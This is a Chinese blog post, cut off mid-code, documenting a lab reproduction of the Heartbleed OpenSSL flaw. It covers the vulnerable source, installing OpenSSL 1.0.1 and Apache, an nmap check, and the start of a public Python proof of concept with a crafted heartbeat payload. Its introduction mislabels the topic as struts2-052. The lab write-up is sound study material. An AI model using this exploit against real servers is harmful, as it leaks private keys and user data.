@@ -1,0 +1,559 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>heartbleed漏洞复现与利用问题 | 让子弹飞一会</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="yfzheng">
+    
+
+    
+    <meta name="description" content="欢迎来我的博客，这是我在学习struts2-052漏洞学习的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞heartbleed漏洞是什么？ 它的基本背景和影响是什么？背景：如果要使 SSL 发挥作用，计算机需要与服务器进行通信。为此，它会发送称为“heartbeat”(心跳)的信息。he">
+<meta property="og:type" content="article">
+<meta property="og:title" content="heartbleed漏洞复现与利用问题">
+<meta property="og:url" content="http://yoursite.com/2018/02/04/webs3-4/index.html">
+<meta property="og:site_name" content="让子弹飞一会">
+<meta property="og:description" content="欢迎来我的博客，这是我在学习struts2-052漏洞学习的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞heartbleed漏洞是什么？ 它的基本背景和影响是什么？背景：如果要使 SSL 发挥作用，计算机需要与服务器进行通信。为此，它会发送称为“heartbeat”(心跳)的信息。he">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-81c1d5698cecc609.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-c48c0786b936870e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-55c4a5e2ab9f0ade.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-db2dca83bf0cd6dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-f81717eb255857c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-3c5d640b029aed4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-e518c9c6f255e6e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-d6c22410e33d7c4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-2c6e0137c918a5ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-2363675ac64d1920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-e7fd92a3e5ffc46c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-45d2b5431b60dfcc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-96cc6bb57dacc02d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-97dfd4dcacedc6e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-24b8c32dc01729b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-760842c8e13e598c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-02-04T08:54:26.175Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="heartbleed漏洞复现与利用问题">
+<meta name="twitter:description" content="欢迎来我的博客，这是我在学习struts2-052漏洞学习的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞heartbleed漏洞是什么？ 它的基本背景和影响是什么？背景：如果要使 SSL 发挥作用，计算机需要与服务器进行通信。为此，它会发送称为“heartbeat”(心跳)的信息。he">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/10457296-81c1d5698cecc609.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+    
+    <link rel="alternative" href="/atom.xml" title="让子弹飞一会" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="让子弹飞一会" title="让子弹飞一会"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="让子弹飞一会">让子弹飞一会</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/04/webs3-4/" title="heartbleed漏洞复现与利用问题" itemprop="url">heartbleed漏洞复现与利用问题</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="yfzheng" target="_blank" itemprop="author">yfzheng</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-04T08:52:30.000Z" itemprop="datePublished"> 发表于 2018-02-04</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解漏洞"><span class="toc-number">1.</span> <span class="toc-text">了解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#heartbleed漏洞是什么？"><span class="toc-number">1.1.</span> <span class="toc-text">heartbleed漏洞是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#它的基本背景和影响是什么？"><span class="toc-number">1.2.</span> <span class="toc-text">它的基本背景和影响是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">分析漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码中那些地方出现了问题？"><span class="toc-number">2.1.</span> <span class="toc-text">源码中那些地方出现了问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"><span class="toc-number">2.2.</span> <span class="toc-text">从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞的复现与利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞的复现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置openssl，如何安装，如何解决系统自带openssl；"><span class="toc-number">3.1.</span> <span class="toc-text">安装配置openssl，如何安装，如何解决系统自带openssl；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置Apache（PHP），如何让Apache与openssl连接；"><span class="toc-number">3.2.</span> <span class="toc-text">安装配置Apache（PHP），如何让Apache与openssl连接；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用openssl生成证书并修改Apache配置，实现https访问；"><span class="toc-number">3.3.</span> <span class="toc-text">利用openssl生成证书并修改Apache配置，实现https访问；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用poc进行攻击，实现预期目标；"><span class="toc-number">3.4.</span> <span class="toc-text">利用poc进行攻击，实现预期目标；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进一步理解heartbleed的漏洞原理"><span class="toc-number">3.5.</span> <span class="toc-text">进一步理解heartbleed的漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#heartbleed漏洞的风险是什么"><span class="toc-number">3.6.</span> <span class="toc-text">heartbleed漏洞的风险是什么</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<p>欢迎来我的博客，这是我在学习struts2-052漏洞学习的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。<br>实验背景：<br>1.VMware 12 pro<br>2.fedora 27</p>
+<h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="heartbleed漏洞是什么？"><a href="#heartbleed漏洞是什么？" class="headerlink" title="heartbleed漏洞是什么？"></a>heartbleed漏洞是什么？</h3><p><img src="http://upload-images.jianshu.io/upload_images/10457296-81c1d5698cecc609.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="它的基本背景和影响是什么？"><a href="#它的基本背景和影响是什么？" class="headerlink" title="它的基本背景和影响是什么？"></a>它的基本背景和影响是什么？</h3><p>背景：如果要使 SSL 发挥作用，计算机需要与服务器进行通信。为此，它会发送称为“heartbeat”(心跳)的信息。heartbeat 所做的就是向服务器发送特定信号以确定服务器是否联机。如果服务器联机，它会向计算机发送回该信号，让用户可以尽享安全的通信。计算机和服务器会定期发送 heartbeat 以确定用户和服务器没有脱机。</p>
+<p>影响：这一漏洞让任何人都能读取系统的运行内存，能使攻击者能够从内存中读取最多64 KB的数据。</p>
+<h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="源码中那些地方出现了问题？"><a href="#源码中那些地方出现了问题？" class="headerlink" title="源码中那些地方出现了问题？"></a>源码中那些地方出现了问题？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dtls1_process_heartbeat</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl; <span class="comment">//p 指向对端发来的心跳数据包</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> hbtype;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> payload;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></span><br><span class="line">……</span><br><span class="line">hbtype = *p++; <span class="comment">//心跳数据包的第0个字节，表示心跳包的类型</span></span><br><span class="line">n2s(p, payload); <span class="comment">//接下来2个字节是长度。n2s 是个宏，把这2个字节取出，保存为整型，然后指针移2字节</span></span><br><span class="line">pl = p; <span class="comment">//此时p指向第3个字节——也就是对端提供的心跳包载荷</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer, *bp;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">buffer = OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding); <span class="comment">//根据 payload 分配内存，额外的3字节用于存放类型和长度</span></span><br><span class="line">bp = buffer;</span><br><span class="line">……</span><br><span class="line">*bp++ = TLS1_HB_RESPONSE; <span class="comment">//填充类型</span></span><br><span class="line">s2n(payload, bp); <span class="comment">//填充长度</span></span><br><span class="line"><span class="built_in">memcpy</span>(bp, pl, payload); <span class="comment">//填充回应包的载荷【亮点在这里】</span></span><br></pre></td></tr></table></figure>
+<p>服务器处理心跳原来的方式是首先直接解析type和payload，什么都不做任何的检查。如果长度跟实际载荷不匹配，那么在发送回应包的时候，那句 memcpy 语句就会把心跳包之后的内存区块也一起 copy 进去，然后发给对端。内存信息就泄露了。</p>
+<h3 id="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"><a href="#从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？" class="headerlink" title="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"></a>从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？</h3><p><img src="http://upload-images.jianshu.io/upload_images/10457296-c48c0786b936870e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在hb中数字表示的意义</span><br><span class="line">18 : hearbeat record </span><br><span class="line">03 02 : TLS version </span><br><span class="line">00 03 : length </span><br><span class="line">01 : hearbeat request </span><br><span class="line">40 00 : payload 长度</span><br></pre></td></tr></table></figure></p>
+<p>漏洞的体现就在于payload的长度没有验证，如果payload长度大于正常应该回应的长度就会发生内存的泄漏。<br>所以我们只要把这个长度改的足够大就话就能保证能从内存中提取出一些信息。</p>
+<h2 id="漏洞的复现与利用"><a href="#漏洞的复现与利用" class="headerlink" title="漏洞的复现与利用"></a>漏洞的复现与利用</h2><h3 id="安装配置openssl，如何安装，如何解决系统自带openssl；"><a href="#安装配置openssl，如何安装，如何解决系统自带openssl；" class="headerlink" title="安装配置openssl，如何安装，如何解决系统自带openssl；"></a>安装配置openssl，如何安装，如何解决系统自带openssl；</h3><p>先查看现在的版本是否存在该漏洞（OpenSSL v1.0.1到1.0.1f存在该漏洞），输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl version -a</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-55c4a5e2ab9f0ade.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>发现当前系统openssl版本不存在漏洞，这时候我们就要安装存在漏洞的版本。我选择的是安装1.0.1版本（在官网上能找到相应的安装包）。</p>
+<p>编译ssl时的配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./config --prefix=/usr/<span class="built_in">local</span>/ssl shared -fPIC no-gost</span><br><span class="line">//shared 是为了生成动态共享库，用来替换系统在的openssl共享库</span><br></pre></td></tr></table></figure></p>
+<p>之后输入命令进行编译安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>在安装过程中如果遇到了这个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]</span><br></pre></td></tr></table></figure></p>
+<p>可以执行下面语句后再重新编译安装。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /usr/bin/pod2man</span><br></pre></td></tr></table></figure></p>
+<p>安装完成后<br>在/etc/ld.so.conf文件的最后面，添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/ssl/lib      //即安装目录下的lib的路径</span><br></pre></td></tr></table></figure></p>
+<p>之后执行下列语句更新一下动态数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure></p>
+<p>在etc／的profile的最后一行添加OPESSL的环境变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export OPENSSL=/usr/local/ssl/bin</span><br><span class="line">export PATH=$OPENSSL:$PATH:$HOME/bin</span><br></pre></td></tr></table></figure></p>
+<p>之后重启，重启后输入:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl version -a</span><br></pre></td></tr></table></figure></p>
+<p>如果出现下面的信息说明把原来的openssl覆盖掉了，安装成功。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-db2dca83bf0cd6dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="安装配置Apache（PHP），如何让Apache与openssl连接；"><a href="#安装配置Apache（PHP），如何让Apache与openssl连接；" class="headerlink" title="安装配置Apache（PHP），如何让Apache与openssl连接；"></a>安装配置Apache（PHP），如何让Apache与openssl连接；</h3><p>安装httpd2.2.34</p>
+<p>首先先解决安装依赖的问题</p>
+<p>在<a href="http://archive.apache.org/dist/apr/" target="_blank" rel="noopener">http://archive.apache.org/dist/apr/</a>下载apr-1.5.1.tar.gz和apr-util-1.5.2.tar.gz</p>
+<p>先安装apr-1.51<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf apr-1.5.1.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>解压后进入相应的目录执行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./configure --prefix=/usr/<span class="built_in">local</span>/apr </span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>之后安装apr-util-1.5.2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf apr-util-1.5.2.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>解压后进入相应的目录执行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>这样两个依赖文件就安装完了，</p>
+<p>在<a href="http://archive.apache.org/dist/httpd/" target="_blank" rel="noopener">http://archive.apache.org/dist/httpd/</a>下载httpd2.2.34</p>
+<p>解压后进入相应文件执行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./configure?--prefix=/usr/<span class="built_in">local</span>/httpd?--<span class="built_in">enable</span>-so?--<span class="built_in">enable</span>-rewrite?--<span class="built_in">enable</span>-ssl?--with-ssl=/usr/<span class="built_in">local</span>/ssl?--with-apr=/usr/<span class="built_in">local</span>/apr?--with-apr-util=/usr/<span class="built_in">local</span>/apr-util</span><br><span class="line">//（--with-ssl=/usr/<span class="built_in">local</span>/ssl这个配置让Apache与openssl连接）</span><br><span class="line">$ sudo make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
+<p>这样就安装完httpd2.2.34了。</p>
+<h3 id="利用openssl生成证书并修改Apache配置，实现https访问；"><a href="#利用openssl生成证书并修改Apache配置，实现https访问；" class="headerlink" title="利用openssl生成证书并修改Apache配置，实现https访问；"></a>利用openssl生成证书并修改Apache配置，实现https访问；</h3><p>首先生成证书<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo openssl genrsa -out server.key 1024     //建立服务器密钥     </span><br><span class="line">$ sudo openssl req -new -key server.key -out server.csr   //建立服务器公钥 	   </span><br><span class="line">$ sudo openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt     //建立服务器证书</span><br></pre></td></tr></table></figure></p>
+<p>之后进入httpd/conf/extra<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim httpd-ssl.conf</span><br></pre></td></tr></table></figure></p>
+<p>将生成密钥和证书的位置修改为你用openssl1.0.1生成的密钥和证书的位置</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-f81717eb255857c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>将servername修改如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-3c5d640b029aed4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>还要在httpd/conf/下修改httpd.conf文件</p>
+<p>第417行<img src="http://upload-images.jianshu.io/upload_images/10457296-e518c9c6f255e6e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>第98行处<img src="http://upload-images.jianshu.io/upload_images/10457296-d6c22410e33d7c4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>之后启动服务</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-2c6e0137c918a5ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="利用poc进行攻击，实现预期目标；"><a href="#利用poc进行攻击，实现预期目标；" class="headerlink" title="利用poc进行攻击，实现预期目标；"></a>利用poc进行攻击，实现预期目标；</h3><p>1）利用nmap的脚本进行检测<br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV 192.168.203.132 --script=ssl-heartbleed （若你修改了端口号则需要把修改的端口号填上）</span><br></pre></td></tr></table></figure></p>
+<p>若出现下面的情况说明存在heartbleed漏洞</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-2363675ac64d1920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>2）利用python代码进行攻击<br>代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span></span><br><span class="line"><span class="comment"># The author disclaims copyright to this source code.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">'%prog server [options]'</span>, description=<span class="string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=<span class="string">'int'</span>, default=<span class="number">443</span>, help=<span class="string">'TCP port to test (default: 443)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">hello = h2bin(<span class="string">'''</span></span><br><span class="line"><span class="string">16 03 02 00  dc 01 00 00 d8 03 02 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01                                  </span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">hb = h2bin(<span class="string">''' </span></span><br><span class="line"><span class="string">18 03 02 00 03</span></span><br><span class="line"><span class="string">01 40 00</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span 